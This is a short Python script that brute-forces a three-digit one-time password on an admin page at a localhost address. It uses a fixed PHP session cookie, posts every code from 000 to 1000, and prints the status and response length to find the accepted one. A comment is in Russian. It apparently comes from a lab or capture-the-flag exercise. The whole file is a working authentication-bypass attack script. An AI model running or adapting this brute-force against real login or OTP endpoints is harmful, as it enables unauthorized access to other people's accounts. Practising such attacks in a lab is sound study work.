import requests


def send_request(session, otp):
    url = "http://localhost:1337/admin/otp.php"
    data = {"OTP": otp}
    cookies = {"PHPSESSID": "1d056b68445f587985ab1462c8200cc7"}
    headers = {"Cookie": "PHPSESSID=1d056b68445f587985ab1462c8200cc7"}

    response = session.post(url, data=data, cookies=cookies, headers=headers)

    print(
        otp,
        type(otp),
        response.status_code,
        response.headers.get("Content-Length"),
    )


def generate_numbers():
    return [f"{i:03d}" for i in range(1001)]


def main():
    # одна сессия на все запросы (аналог ClientSession)
    with requests.Session() as session:
        for i in generate_numbers():
            send_request(session, i)


if __name__ == "__main__":
    main()
